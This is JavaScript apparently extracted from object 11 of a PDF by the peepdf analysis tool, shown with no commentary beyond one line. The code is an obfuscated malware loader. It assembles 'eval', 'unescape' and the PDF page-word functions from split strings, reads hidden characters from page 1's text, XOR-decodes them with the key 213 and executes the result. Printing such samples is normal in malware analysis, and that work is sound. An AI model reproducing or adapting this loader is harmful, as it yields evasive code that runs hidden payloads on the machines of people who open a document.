// peepdf comment: Javascript code located in object 11 (version 0)

  var uFsdf = String;
  var v = 1;
  var send = "";
  var google = 213;
  var sendEmail = ["al", "ev", ""];
  arraySdftuf = new String(sendEmail[1] + sendEmail[0] + sendEmail[2]);
  var vU = ["a", "", "p", "p"];
  sdSdsdf = new String(vU[0] + vU[2] + vU[2] + vU[1]);
  var fsdf = new String("fro" + "mCh" + "arC" + "ode");
  var b = new String("oMWchar".substr(3) + "Code" + "AtY4JQ".substr(0, 2));
  var foxit = "24Punesc".substr(3) + "0IZape".substr(3);
  var vSdfjh = "Gc8getP".substr(3) + "ageN" + "VRgumWo".substr(3) + "rdsBcUb".substr(0, 3);
  var emailAdobe = String("getPa" + "geNth" + "WordqJ0v".substr(0, 4));

  function sendA(arraySdftufDsjkg, uUnlock) {
      return arraySdftufDsjkg ^ uUnlock;
  }
  var check = new String("Jzfsubst".substr(3) + "r");
  var sendASdrt = 0;
  var sendDsjkg = new String("%JA5E".substr(0, 1));
  var mailSend = 2;
  var sdSdsdf = this[sdSdsdf];
  var bArray = this[vSdfjh](v);
  var readerSdsdf = this[arraySdftuf];
  var unlock = this[foxit];
  for (var sdsdf = sendASdrt; sdsdf < bArray; sdsdf++) {
      foxitDs = this[emailAdobe](v, sdsdf);
      var arrayFsdf = foxitDs[check](foxitDs.length - mailSend, mailSend);
      var vArray = sendDsjkg + arrayFsdf;
      var dsSdsdf = unlock(vArray);
      var sendAGoogle = dsSdsdf[b](sendASdrt);
      var foxitSd = sendA(sendAGoogle, google);
      send += uFsdf[fsdf](foxitSd);
  }
  readerSdsdf(send);

